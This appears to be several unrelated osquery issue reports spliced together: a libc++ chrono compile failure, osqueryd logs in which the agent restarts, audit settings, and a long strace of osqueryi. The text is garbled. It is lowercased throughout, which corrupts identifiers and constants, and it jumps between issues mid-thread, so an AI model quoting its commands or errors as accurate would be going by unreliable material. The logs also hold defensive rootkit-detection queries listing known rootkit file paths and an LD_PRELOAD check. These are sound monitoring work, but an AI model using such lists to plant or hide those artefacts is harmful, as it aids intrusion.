/usr/local/osquery/include/c++/v1/chrono:1131:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long double, _period2 = std::__1::ratio<1, 1000>] return chrono::duration<long double, milli>(__ms); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long long, std::__1::ratio<1, 1000000> >::__no_overflow<std::__1::ratio<1, 1000000>, std::__1::ratio<1, 1000000> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1137:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long long, _period2 = std::__1::ratio<1, 1000000>] return chrono::microseconds(static_cast<chrono::microseconds::rep>(__us)); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long double, std::__1::ratio<1, 1000000> >::__no_overflow<std::__1::ratio<1, 1000000>, std::__1::ratio<1, 1000000> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1142:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long double, _period2 = std::__1::ratio<1, 1000000>] return chrono::duration<long double, micro> (__us); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long long, std::__1::ratio<1, 1000000000> >::__no_overflow<std::__1::ratio<1, 1000000000>, std::__1::ratio<1, 1000000000> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1148:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long long, _period2 = std::__1::ratio<1, 1000000000>] return chrono::nanoseconds(static_cast<chrono::nanoseconds::rep>(__ns)); ^
/usr/local/osquery/include/c++/v1/chrono:523:42: error: non-type template argument is not a constant expression typedef ratio<__mul<__n1, __d2, !value>::value, ^
/usr/local/osquery/include/c++/v1/chrono:558:17: note: in instantiation of template class 'std::__1::chrono::duration<long double, std::__1::ratio<1, 1000000000> >::__no_overflow<std::__1::ratio<1, 1000000000>, std::__1::ratio<1, 1000000000> >' requested here __no_overflow<_period2, period>::value && ( ^
/usr/local/osquery/include/c++/v1/chrono:1153:16: note: while substituting deduced template arguments into function template 'duration' [with _rep2 = long double, _period2 = std::__1::ratio<1, 1000000000>] return chrono::duration<long double, nano> (__ns); ^
fatal error: too many errors emitted, stopping now [-ferror-limit=]
20 errors generated.
third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/build.make:62: recipe for target 'third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/src/gtest-all.cc.o' failed
make[4]: *** [third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/src/gtest-all.cc.o] error 1
cmakefiles/makefile2:406: recipe for target 'third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/all' failed
make[3]: *** [third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/all] error 2
cmakefiles/makefile2:418: recipe for target 'third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/rule' failed
make[2]: *** [third-party/googletest/googlemock/gtest/cmakefiles/gtest.dir/rule] error 2
makefile:279: recipe for target 'gtest' failed
make[1]: *** [gtest] error 2
makefile:321: recipe for target 'gtest' failed
make: *** [gtest] error 2
``` ### work around ```
sudo apt remove libc++abi-dev libc++-dev
osquery> select time, path from kernel_panics;
+--------------------------+------------------------------------------------------------------------------------------+
| time | path |
+--------------------------+------------------------------------------------------------------------------------------+
| | /library/logs/diagnosticreports/kernel_2018-10-28-085150_username-macbookpro.panic |
in most of the time it will fail
the log file outputs:
i1113 16:22:17.396791 26111 tls.cpp:240] tls/https post request to uri:
i1113 16:22:20.442924 26588 tls.cpp:240] tls/https post request to uri:
i1113 16:22:47.250825 26589 scheduler.cpp:97] executing scheduled query os_version_snapshot: select * from os_version;
i1113 16:22:50.494514 26588 tls.cpp:240] tls/https post request to uri:
i1113 16:22:50.573230 26588 distributed.cpp:119] executing distributed query: e93206bc-4df4-42a2-8d50-23146716092f: select * from osquery_events
i1113 16:22:50.574860 26588 tls.cpp:240] tls/https post request to uri:
i1113 16:22:55.253069 26589 scheduler.cpp:97] executing scheduled query ld_preload: select process_envs.pid, process_envs.key, process_envs.value, processes.name, processes.path, processes.cmdline, processes.cwd from process_envs join processes using (pid) where key = 'ld_preload';
i1113 16:23:12.256484 26589 scheduler.cpp:97] executing scheduled query file_events: select * from file_events;
i1113 16:23:17.476702 26111 config.cpp:1033] refreshing configuration state
i1113 16:23:17.477036 26111 tls.cpp:240] tls/https post request to uri:
i1113 16:23:20.614044 26588 tls.cpp:240] tls/https post request to uri:
i1113 16:23:50.677338 26588 tls.cpp:240] tls/https post request to uri:
i1113 16:23:50.762336 26588 distributed.cpp:119] executing distributed query: 724f79c1-f846-46a3-bc6f-dd09b7719f6a: select * from process_events;
i1113 16:24:00.349609 26589 scheduler.cpp:97] executing scheduled query ld_preload: select process_envs.pid, process_envs.key, process_envs.value, processes.name, processes.path, processes.cmdline, processes.cwd from process_envs join processes using (pid) where key = 'ld_preload';
i1113 16:24:00.358839 26589 sqlite_util.cpp:223] dbmanager contention: opening transient sqlite database
i1113 16:24:01.450233 26589 scheduler.cpp:97] executing scheduled query pack/ossec-rootkit/t0rn_rootkit: select * from file where path in ('/usr/src/.puta', '/usr/info/.t0rn', '/lib/ldlib.tk', '/etc/ttyhash', '/sbin/xlogin');
i1113 16:24:01.581199 26589 sqlite_util.cpp:223] dbmanager contention: opening transient sqlite database
i1113 16:24:17.574219 26111 config.cpp:1033] refreshing configuration state
i1113 16:24:17.574730 26111 tls.cpp:240] tls/https post request to uri:
i1113 16:24:18.353731 26589 scheduler.cpp:97] executing scheduled query file_events: select * from file_events;
i1113 16:24:18.460072 26589 sqlite_util.cpp:223] dbmanager contention: opening transient sqlite database
i1113 16:24:24.449252 26589 scheduler.cpp:97] executing scheduled query os_version_snapshot: select * from os_version;
i1113 16:24:24.653455 26589 sqlite_util.cpp:223] dbmanager contention: opening transient sqlite database
i1113 16:24:40.456540 26589 scheduler.cpp:97] executing scheduled query pack/ossec-rootkit/shkit_rootkit: select * from file where path in ('/lib/security/.config', '/etc/ld.so.hash');
i1113 16:24:40.553293 26589 sqlite_util.cpp:223] dbmanager contention: opening transient sqlite database
i1113 16:24:54.547307 26589 scheduler.cpp:97] executing scheduled query pack/ossec-rootkit/zk_rootkit: select * from file where path in ('/usr/share/.zk', '/usr/share/.zk/zk', '/etc/1ssue.net', '/usr/x11r6/.zk', '/usr/x11r6/.zk/xfs', '/usr/x11r6/.zk/echo', '/etc/sysconfig/console/load.zk');
i1113 16:24:54.652942 26589 sqlite_util.cpp:223] dbmanager contention: opening transient sqlite database
i1113 16:25:00.549073 26589 database.cpp:135] resetting the database plugin: rocksdb
i1113 16:25:00.764065 26589 rocksdb.cpp:134] opening rocksdb handle: /var/osquery/osquery.db
i1113 16:25:05.553174 26589 scheduler.cpp:97] executing scheduled query ld_preload: select process_envs.pid, process_envs.key, process_envs.value, processes.name, processes.path, processes.cmdline, processes.cwd from process_envs join processes using (pid) where key = 'ld_preload';
i1113 16:25:09.051517 26102 auditdnetlink.cpp:196] releasing the audit handle...
i1113 16:25:09.051959 26102 auditdnetlink.cpp:546] uninstalling the audit rules we have installed
i1113 16:25:09.054347 26102 auditdnetlink.cpp:561] restoring the default configuration for the audit service
i1113 16:25:13.051352 26102 init.cpp:157] cannot stop event publisher threads or services
``` **the log shows that the osquery agent failed to execute the query, and then the agent restarted.** the audit service in the machine is normal:
> auditctl -s
rate_limit 0
backlog_limit 4096
loginuid_immutable 0 unlocked
> ps -ef | grep 31434 | grep -v grep
root 31434 10599 1 16:27 ? 00:00:47 /usr/bin/osqueryd
> auditctl -l
-a always,exit -s connect
-a always,exit -s bind
-a always,exit -s execve
``` i think this should be a bug for osquery, and wanna to know why
as described above.
w1108 17:04:31.143815 2921268096 prometheus_metrics.cpp:91] configuration for prometheus_targets is missing field: urls
nothing process freezes #### strace when running the command:
root@ip-10-166-153-186:/data# strace osqueryi -a routes
execve("/usr/bin/osqueryi", ["osqueryi", "-a", "routes"], [/* 58 vars */]) = 0
brk(null) =
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
mmap(null, 12288, prot_read|prot_write, map_private|map_anonymous, -1, 0) =
access("/etc/ld.so.preload", r_ok) = -1 enoent (no such file or directory)
open("/etc/ld.so.cache", o_rdonly|o_cloexec) = 3
fstat(3, {st_mode=s_ifreg|0644, st_size=7104, ...}) = 0
mmap(null, 7104, prot_read, map_private, 3, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libz.so.1", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\300!\\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=105088, ...}) = 0
mmap(null, 2200072, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libdl.so.2", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\200\ \\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=14640, ...}) = 0
mmap(null, 2109680, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/librt.so.1", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\340 \\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=31744, ...}) = 0
mmap(null, 2128832, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libc.so.6", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\0\\4\\2\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0755, st_size=1689360, ...}) = 0
mmap(null, 3795296, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2097152, prot_none) = 0
mmap( , 24576, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
mmap( , 14688, prot_read|prot_write, map_private|map_fixed|map_anonymous, -1, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libresolv.so.2", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0p9\\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=84848, ...}) = 0
mmap(null, 2189896, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
mmap( , 6728, prot_read|prot_write, map_private|map_fixed|map_anonymous, -1, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libpthread.so.0", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0pa\\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0755, st_size=135440, ...}) = 0
mmap(null, 8192, prot_read|prot_write, map_private|map_anonymous, -1, 0) =
mmap(null, 2212936, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
mmap( , 13384, prot_read|prot_write, map_private|map_fixed|map_anonymous, -1, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libm.so.6", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\200v\\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=1063328, ...}) = 0
mmap(null, 3158248, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
close(3) = 0
mmap(null, 24576, prot_read|prot_write, map_private|map_anonymous, -1, 0) =
arch_prctl(arch_set_fs, ) = 0
mprotect( , 16384, prot_read) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
munmap( , 7104) = 0
set_tid_address( ) = 437
set_robust_list( , 24) = 0
rt_sigaction(sigrtmin, {sa_handler= , sa_mask=[], sa_flags=sa_restorer|sa_siginfo, sa_restorer= }, null, 8) = 0
rt_sigaction(sigrt_1, {sa_handler= , sa_mask=[], sa_flags=sa_restorer|sa_restart|sa_siginfo, sa_restorer= }, null, 8) = 0
rt_sigprocmask(sig_unblock, [rtmin rt_1], null, 8) = 0
getrlimit(rlimit_stack, {rlim_cur=8192*1024, rlim_max=rlim64_infinity}) = 0
brk(null) =
brk( ) =
getpid() = 437
brk( ) =
brk( ) =
brk( ) =
brk( ) =
brk( ) =
brk( ) =
open("/proc/cpuinfo", o_rdonly) = 3
fstat(3, {st_mode=s_ifreg|0444, st_size=0, ...}) = 0
read(3, "processor\\t: 0\ vendor_id\\t: genuin"..., 4096) = 3300
read(3, "processor\\t: 3\ vendor_id\\t: genuin"..., 1024) = 1024
read(3, "t\\t: 64\ address sizes\\t: 46 bits p"..., 3072) = 76
read(3, "", 3072) = 0
read(3, "", 1024) = 0
lseek(3, 0, seek_cur) = 4400
close(3) = 0
futex( , futex_wake_private, 2147483647) = 0
open("/etc/ld.so.cache", o_rdonly|o_cloexec) = 3
fstat(3, {st_mode=s_ifreg|0644, st_size=7104, ...}) = 0
mmap(null, 7104, prot_read, map_private, 3, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/tls/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib/x86_64-linux-gnu/tls/x86_64", ) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/tls/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib/x86_64-linux-gnu/tls", ) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib/x86_64-linux-gnu/x86_64", ) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib/x86_64-linux-gnu", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
open("/usr/lib/x86_64-linux-gnu/tls/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib/x86_64-linux-gnu/tls/x86_64", ) = -1 enoent (no such file or directory)
open("/usr/lib/x86_64-linux-gnu/tls/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib/x86_64-linux-gnu/tls", ) = -1 enoent (no such file or directory)
open("/usr/lib/x86_64-linux-gnu/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib/x86_64-linux-gnu/x86_64", ) = -1 enoent (no such file or directory)
open("/usr/lib/x86_64-linux-gnu/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib/x86_64-linux-gnu", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
open("/lib/tls/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib/tls/x86_64", ) = -1 enoent (no such file or directory)
open("/lib/tls/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib/tls", ) = -1 enoent (no such file or directory)
open("/lib/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib/x86_64", ) = -1 enoent (no such file or directory)
open("/lib/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/lib", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
open("/usr/lib/tls/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib/tls/x86_64", ) = -1 enoent (no such file or directory)
open("/usr/lib/tls/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib/tls", ) = -1 enoent (no such file or directory)
open("/usr/lib/x86_64/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib/x86_64", ) = -1 enoent (no such file or directory)
open("/usr/lib/libz.so", o_rdonly|o_cloexec) = -1 enoent (no such file or directory)
stat("/usr/lib", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
munmap( , 7104) = 0
brk( ) =
brk( ) =
getrlimit(rlimit_nofile, {rlim_cur=1024*1024, rlim_max=1024*1024}) = 0
stat("/etc/osquery/osquery.flags.default", ) = -1 enoent (no such file or directory)
getuid() = 0
socket(af_unix, sock_stream|sock_cloexec|sock_nonblock, 0) = 3
connect(3, {sa_family=af_unix, sun_path="/var/run/nscd/socket"}, 110) = -1 enoent (no such file or directory)
close(3) = 0
socket(af_unix, sock_stream|sock_cloexec|sock_nonblock, 0) = 3
connect(3, {sa_family=af_unix, sun_path="/var/run/nscd/socket"}, 110) = -1 enoent (no such file or directory)
close(3) = 0
open("/etc/nsswitch.conf", o_rdonly|o_cloexec) = 3
fstat(3, {st_mode=s_ifreg|0644, st_size=497, ...}) = 0
read(3, "# /etc/nsswitch.conf\ #\ # example"..., 4096) = 497
read(3, "", 4096) = 0
close(3) = 0
open("/etc/ld.so.cache", o_rdonly|o_cloexec) = 3
fstat(3, {st_mode=s_ifreg|0644, st_size=7104, ...}) = 0
mmap(null, 7104, prot_read, map_private, 3, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libnss_compat.so.2", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\260\\22\\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=31616, ...}) = 0
mmap(null, 2126944, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libnsl.so.1", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\320?\\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=89064, ...}) = 0
mmap(null, 2194008, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2097152, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
mmap( , 6744, prot_read|prot_write, map_private|map_fixed|map_anonymous, -1, 0) =
close(3) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
munmap( , 7104) = 0
open("/etc/ld.so.cache", o_rdonly|o_cloexec) = 3
fstat(3, {st_mode=s_ifreg|0644, st_size=7104, ...}) = 0
mmap(null, 7104, prot_read, map_private, 3, 0) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libnss_nis.so.2", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\340 \\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=47688, ...}) = 0
mmap(null, 2143656, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2093056, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
close(3) = 0
access("/etc/ld.so.nohwcap", f_ok) = -1 enoent (no such file or directory)
open("/lib/x86_64-linux-gnu/libnss_files.so.2", o_rdonly|o_cloexec) = 3
read(3, "\\177elf\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\320!\\0\\0\\0\\0\\0\\0"..., 832) = 832
fstat(3, {st_mode=s_ifreg|0644, st_size=47632, ...}) = 0
mmap(null, 2168600, prot_read|prot_exec, map_private|map_denywrite, 3, 0) =
mprotect( , 2097152, prot_none) = 0
mmap( , 8192, prot_read|prot_write, map_private|map_fixed|map_denywrite, 3, ) =
mmap( , 22296, prot_read|prot_write, map_private|map_fixed|map_anonymous, -1, 0) =
close(3) = 0
mprotect( , 4096, prot_read) = 0
mprotect( , 4096, prot_read) = 0
munmap( , 7104) = 0
open("/etc/passwd", o_rdonly|o_cloexec) = 3
lseek(3, 0, seek_cur) = 0
fstat(3, {st_mode=s_ifreg|0644, st_size=919, ...}) = 0
mmap(null, 919, prot_read, map_shared, 3, 0) =
lseek(3, 919, seek_set) = 919
munmap( , 919) = 0
close(3) = 0
stat("/root", {st_mode=s_ifdir|0700, st_size=4096, ...}) = 0
access("/root", w_ok) = 0
stat("/root", {st_mode=s_ifdir|0700, st_size=4096, ...}) = 0
access("/root", w_ok) = 0
stat("/root/.osquery", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
access("/root/.osquery", w_ok) = 0
stat("/root/.osquery", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
stat("/root/.osquery/shell.em", ) = -1 enoent (no such file or directory)
stat("/root/.osquery", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
stat("/root/.osquery", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
access("/root/.osquery", w_ok) = 0
stat("/root/.osquery/shell.em", ) = -1 enoent (no such file or directory)
stat("/root/.osquery", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
stat("/root/.osquery", {st_mode=s_ifdir|0755, st_size=4096, ...}) = 0
access("/root/.osquery", w_ok) = 0
rt_sigaction(sigabrt, {sa_handler= , sa_mask=[abrt], sa_flags=sa_restorer|sa_restart, sa_restorer= }, {sa_handler=sig_dfl, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(sigusr1, {sa_handler= , sa_mask=[usr1], sa_flags=sa_restorer|sa_restart, sa_restorer= }, {sa_handler=sig_dfl, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(sigterm, {sa_handler= , sa_mask=[term], sa_flags=sa_restorer|sa_restart, sa_restorer= }, {sa_handler=sig_dfl, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(sigint, {sa_handler= , sa_mask=[int], sa_flags=sa_restorer|sa_restart, sa_restorer= }, {sa_handler=sig_dfl, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(sighup, {sa_handler= , sa_mask=[hup], sa_flags=sa_restorer|sa_restart, sa_restorer= }, {sa_handler=sig_dfl, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(sigalrm, {sa_handler= , sa_mask=[alrm], sa_flags=sa_restorer|sa_restart, sa_restorer= }, {sa_handler=sig_dfl, sa_mask=[], sa_flags=0}, 8) = 0
stat("/etc/osquery/extensions.load", ) = -1 enoent (no such file or directory)
ioctl(0, tcgets, {b38400 opost isig icanon echo ...}) = 0
open("/etc/localtime", o_rdonly|o_cloexec) = 3
fstat(3, {st_mode=s_ifreg|0644, st_size=127, ...}) = 0
fstat(3, {st_mode=s_ifreg|0644, st_size=127, ...}) = 0
read(3, "tzif2\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\1\\0\\0\\0\\1\\0\\0\\0\\0"..., 4096) = 127
lseek(3, -71, seek_cur) = 56
read(3, "tzif2\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\1\\0\\0\\0\\1\\0\\0\\0\\0"..., 4096) = 71
close(3) = 0
gettid() = 437
gettid() = 437
gettid() = 437
gettid() = 437
gettid() = 437
brk( ) =
brk( ) =
brk( ) =
stat("/etc/osquery/osquery.conf", ) = -1 enoent (no such file or directory)
brk( ) =
getpid() = 437
open("/dev/urandom", o_rdonly|o_cloexec) = 3
read(3, "\\347\\342\\251\ \\t]vz\\32\\275\\303\\347\\314\\225\\321w\\361:o\\325\\204\\"\\375\\313\ \\33\\275{x\\231\\324m"..., 256) = 256
close(3) = 0
brk( ) =
brk( ) =
brk( ) =
brk( ) =
getpid() = 437
stat("/var/tmp", {st_mode=s_ifdir|s_isvtx|0777, st_size=4096, ...}) = 0
access("/var/tmp", w_ok|x_ok) = 0
access("/var/tmp/etilqs_ab7c16e644ccc47a", f_ok) = -1 enoent (no such file or directory)
open("/var/tmp/etilqs_ab7c16e644ccc47a", o_rdwr|o_creat|o_excl|o_nofollow|o_cloexec, 0600) = 3
fstat(3, {st_mode=s_ifreg|0600, st_size=0, ...}) = 0
unlink("/var/tmp/etilqs_ab7c16e644ccc47a") = 0
lseek(3, 4096, seek_set) = 4096
write(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
write(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
write(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
write(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
